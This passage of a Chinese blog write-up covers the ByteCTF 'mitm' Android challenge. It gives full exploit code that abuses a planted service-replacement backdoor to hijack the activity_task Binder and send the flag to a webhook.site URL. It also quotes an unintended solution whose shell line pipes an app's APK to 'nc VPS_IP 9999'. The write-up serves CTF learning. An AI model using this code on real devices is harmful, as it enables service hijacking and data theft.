文件启动，并在整个系统运行期间管理所有的系统服务。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204144151434.png" alt="image-20260204144151434"></p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204145922640.png" alt="image-20260204145922640"></p><h3 id="系统环境分析"><a href="#系统环境分析" class="headerlink" title="系统环境分析"></a>系统环境分析</h3><p>read.me</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在Android Studio中通过SDK Manager -&gt; SDK Update Sites添加如下url:</span><br><span class="line">https://gwynsh.oss-cn-shanghai.aliyuncs.com/mitm.xml</span><br><span class="line">之后就可以创建模拟器在本地测试。</span><br></pre></td></tr></table></figure><p>有提示告诉我们启动一个出题人魔改的镜像</p><p>复现的时候</p><p>damn</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260203225130334.png" alt="image-20260203225130334"></p><p>2026了 4年了 已经寄了</p><p>没办法只能分析下思想了</p><blockquote><p>使用HexWin64和DiskGenius搜索字符串并进行定位，发现在&#x2F;system&#x2F;framework&#x2F;service.jar 中的com.android.server.am.ActivityManagerService 包含一个方法，也就是说官方给了一个方法用于添加系统服务，但是这个函数没有直接被加在service上（仅有“后端”，没有“前端”），也需要通过transcat来调用，具体写法可以模仿check函数。</p><p>godGiveMeAddService接收两个参数：name 和 service。其中，name 表示要添加的 Service 的名称，service 是一个 IBinder 对象，用于提供对该 Service 的访问。</p><p>其中的addService方法有两个特点：</p><ul><li>如果添加的是已经存在的service，默认会进行替换</li><li>普通APP的service被添加后，权限不会变化，不会获得system权限</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">godGiveMeAddService</span><span class="params">(String name, IBinder service)</span> &#123;</span><br><span class="line">      Log.d(<span class="string">&quot;Bytedance&quot;</span>, <span class="string">&quot;Android God gives you addService()&quot;</span>);</span><br><span class="line">      ServiceManager.addService(name, service, <span class="literal">false</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在&#x2F;system&#x2F;framework&#x2F;framework.jar的android.app.IActivityManager中找到关于该方法的更多细节，首先是定义了static final int TRANSACTION_godGiveMeAddService &#x3D; 223; 即TRANSACTION_code ，然后定义了收到transcat 时的动作，获取到Parcel对象中的数据后调用godGiveMeAddService </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTransact</span><span class="params">(<span class="type">int</span> code, Parcel data, Parcel reply, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">223</span>:</span><br><span class="line">    data.enforceInterface(DESCRIPTOR);</span><br><span class="line">    <span class="type">String</span> <span class="variable">_arg0183</span> <span class="operator">=</span> data.readString();</span><br><span class="line">    <span class="type">IBinder</span> <span class="variable">_arg1126</span> <span class="operator">=</span> data.readStrongBinder();</span><br><span class="line">    godGiveMeAddService(_arg0183, _arg1126);</span><br><span class="line">    reply.writeNoException();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>前面提到的check要直接通过transcat调用，主要有两点原因：</p><p>替换了system service之后，并不是所有系统请求立刻会走新的service，原因是framework中会保存许多binder，就好像缓存一样，因此必须通过getService拿到新的binder并发送请求</p><p>方便选手模仿这个函数调用godGiveMeAddService</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://yimianweishi.github.io/cn/bytectf-mitm/">bytectf_mitm - marginal’s blog</a></p><p>通过jadx的分析我们看到check()在与activity_task通讯返回1337之后会把flag信息通过广播发送出去，看到这里题目的意思应该是让我们想办法更改activity_task服务的返回值以及写一个广播接收器.</p><p>首先是更改activtiy_task服务, 这个服务属于系统服务, 普通app没有权限去更改系统服务, 也就是没有权限调用android.os.ServiceManager.addService()这个方法.所以我们得借助更高权限的应用来达到我们的目的. 拥有这一权限的应用, 比如系统app(存放在&#x2F;system&#x2F;priv-app, &#x2F;system&#x2F;app等目录下, 用户安装的app在&#x2F;data&#x2F;app目录下), 还有就是frameworks(activty_task服务的注册就是在这里).</p><p>首先需要提取frameworks.jar以及service.jar(要寻找服务添加的权限提升, services.jar就是服务注册代码的存放位置), 直接用adb从模拟器pull下来就行了</p><p>在services.jar找到权限提升漏洞的地方, 明显看出来这其实是出题人留下的后门</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">godGiveMeAddService</span><span class="params">(String name, IBinder service)</span> &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;Bytedance&quot;</span>, <span class="string">&quot;Android God gives you addService()&quot;</span>);</span><br><span class="line">    ServiceManager.addService(name, service, <span class="literal">false</span>, <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找一下交叉引用发现services.jar里面没有, framework.jar: android.app.IActivityManager存在调用:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTransact</span><span class="params">(<span class="type">int</span> code, Parcel data, Parcel reply, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="type">Stub</span> <span class="variable">iActivityManager$Stub0</span> <span class="operator">=</span> <span class="built_in">this</span>;</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">parcel2</span> <span class="operator">=</span> data;</span><br><span class="line">    <span class="type">Parcel</span> <span class="variable">parcel3</span> <span class="operator">=</span> reply;</span><br><span class="line">    <span class="keyword">if</span>(code != <span class="number">0x5F4E5446</span>) &#123;</span><br><span class="line">        <span class="type">IBinder</span> <span class="variable">iBinder0</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span>(code) &#123;</span><br><span class="line">        <span class="comment">//...................................................................</span></span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xDF</span>: &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">default</span>: &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onTransact(code, data, reply, flags);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parcel2.enforceInterface(<span class="string">&quot;android.app.IActivityManager&quot;</span>);</span><br><span class="line">        iActivityManager$Stub0.godGiveMeAddService(data.readString(), data.readStrongBinder());</span><br><span class="line">        reply.writeNoException();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//..........................</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//............</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也是一个binder通讯, 所以目前大致的思路是</p><ol><li>设计一个binder, onTransact通讯在code等于0x11的时候往返回包里面写一个0x539</li><li>用binder与android.app.IActivityManager通讯, 将activtiy_task服务替换为我们自己设计的binder</li><li>注册一个广播接收器, 接受action为”bytedance.ctf.androidmitm”的广播</li><li>启动app-debug.apk应用, 触发check函数.</li><li>广播接收器进行flag接收与发送</li></ol><p><strong>利用类似中间人攻击的思路，用自己继承的Binder替换掉ActivityTaskManagerService，然后就可以任意控制返回结果，但是也要注意必须保存ActivityTaskManagerService，因为本身攻击只是做一个中间人，如果直接替换而不进行保存和后续调用就会引发错误。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBinder</span> <span class="keyword">extends</span> <span class="title class_">Binder</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">onTransact</span><span class="params">(<span class="type">int</span> code, <span class="meta">@NonNull</span> Parcel data, <span class="meta">@Nullable</span> Parcel reply, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;hit&quot;</span>, String.valueOf(code));</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="number">17</span>) &#123;</span><br><span class="line">            reply.writeNoException();</span><br><span class="line">            reply.writeInt(<span class="number">1337</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> origin.transact(code, data, reply, flags);</span><br><span class="line">        <span class="comment">// 注意，这是必须的，否则无法正常startActivity</span></span><br><span class="line">        <span class="comment">// 也就是需要一个完整的“MITM”</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivity</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.attackmitm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.NonNull;</span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.ActivityManager;</span><br><span class="line"><span class="keyword">import</span> android.app.Service;</span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.ComponentName;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.content.IntentFilter;</span><br><span class="line"><span class="keyword">import</span> android.content.ServiceConnection;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.net.wifi.aware.PublishConfig;</span><br><span class="line"><span class="keyword">import</span> android.os.Binder;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcel;</span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.ProtocolException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;Evil&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> IBinder origin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBinder</span> <span class="keyword">extends</span> <span class="title class_">Binder</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">onTransact</span><span class="params">(<span class="type">int</span> code, <span class="meta">@NonNull</span> Parcel data, <span class="meta">@Nullable</span> Parcel reply, <span class="type">int</span> flags)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;hit&quot;</span>, String.valueOf(code));</span><br><span class="line">            <span class="keyword">if</span>(code == <span class="number">17</span>) &#123;</span><br><span class="line">                reply.writeNoException();</span><br><span class="line">                reply.writeInt(<span class="number">1337</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> origin.transact(code, data, reply, flags);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">BroadcastReceiver</span> <span class="variable">flagReceiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;bytedance.ctf.androidmitm&quot;</span>)) &#123;</span><br><span class="line">                httpGet(intent.getStringExtra(<span class="string">&quot;flag&quot;</span>));</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;FLAG_RECEIVER&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        registerReceiver(flagReceiver, <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(<span class="string">&quot;bytedance.ctf.androidmitm&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            origin = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>).getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;activity_task&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">IBinder</span> <span class="variable">am</span> <span class="operator">=</span> (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>).getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;activity&quot;</span>);</span><br><span class="line"></span><br><span class="line">            addService(am, <span class="string">&quot;activity_task&quot;</span>, <span class="keyword">new</span> <span class="title class_">MyBinder</span>());</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent_mitm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent_mitm.setClassName(<span class="string">&quot;com.bytectf.mitm&quot;</span>, <span class="string">&quot;com.bytectf.mitm.MainActivity&quot;</span>);</span><br><span class="line">        startActivity(intent_mitm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addService</span><span class="params">(IBinder am, String name, IBinder service)</span> &#123;</span><br><span class="line">        <span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">        <span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">        _data.writeInterfaceToken(<span class="string">&quot;android.app.IActivityManager&quot;</span>);</span><br><span class="line">        _data.writeString(name);</span><br><span class="line">        _data.writeStrongBinder(service);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            am.transact(<span class="number">223</span>, _data, _reply, <span class="number">0</span>);</span><br><span class="line">            _reply.readException();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span> &#123;</span><br><span class="line">            _data.recycle();</span><br><span class="line">            _reply.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">httpGet</span><span class="params">(String msg)</span>&#123;</span><br><span class="line">        Log.d(TAG, msg);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">HttpURLConnection</span> <span class="variable">httpURLConnection</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://webhook.site/23772e88-xxxxxxxxxx/?msg=&quot;</span> + msg);</span><br><span class="line">                    httpURLConnection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    httpURLConnection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    httpURLConnection.getInputStream();</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>① 保存原始的 activity_task Binder：origin &#x3D; getService(“activity_task”)</p><p>② 拿到 activity 服务的 Binder：IBinder am &#x3D; getService(“activity”)</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204151914976.png" alt="image-20260204151914976"></p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>来自WM</p><blockquote><p>在比赛的第一天，我们发现题目存在非预期解，主要原因在于APP可以申请QUERY_ALL_PACKAGES权限，这是一个normal permission，会自动赋予APP。然后通过PackageManager查询到被攻击APP的base apk路径，进而直接读取APK。</p></blockquote><p>在这里引用<strong>W&amp;M</strong>的非预期解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission-sdk-23 android:name=&quot;android.permission.QUERY_ALL_PACKAGES&quot;/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;pm path com.bytedance.mitm&quot;</span>);</span><br><span class="line">        <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(exec.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> bufferedReader.readLine();</span><br><span class="line">        s = s.replace(<span class="string">&quot;package:&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;test1aaaa: &quot;</span>+s);</span><br><span class="line">        <span class="keyword">if</span> (s != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> s;</span><br><span class="line">            String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat &quot;</span> + file + <span class="string">&quot; | nc VPS_IP 9999&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">//String cmd = &quot;ls -la &quot;+fiale;</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">exec1</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">                <span class="type">InputStreamReader</span> <span class="variable">inputStreamReader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(exec1.getInputStream());</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">bufferedReader1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(inputStreamReader1);</span><br><span class="line">                <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> bufferedReader1.readLine();</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;test1bbbb: &quot;</span>+s1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;test1cccc: &quot;</span>,e);</span><br><span class="line"></span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里不是用 PackageManager API，而是直接起了一个 shell 命令 <code>pm</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260204161900479.png" alt="image-20260204161900479"></p></blockquote><p>效果是一样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnsilverdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.ApplicationInfo;</span><br><span class="line"><span class="keyword">import</span> android.content.pm.PackageManager;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.test.platform.app.InstrumentationRegistry;</span><br><span class="line"><span class="keyword">import</span> androidx.test.ext.junit.runners.AndroidJUnit4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.junit.Assert.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Instrumented test, which will execute on an Android device.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> &lt;a href=&quot;http://d.android.com/tools/testing&quot;&gt;Testing documentation&lt;/a&gt;</span></span><br><span class="line"><span class="comment"> 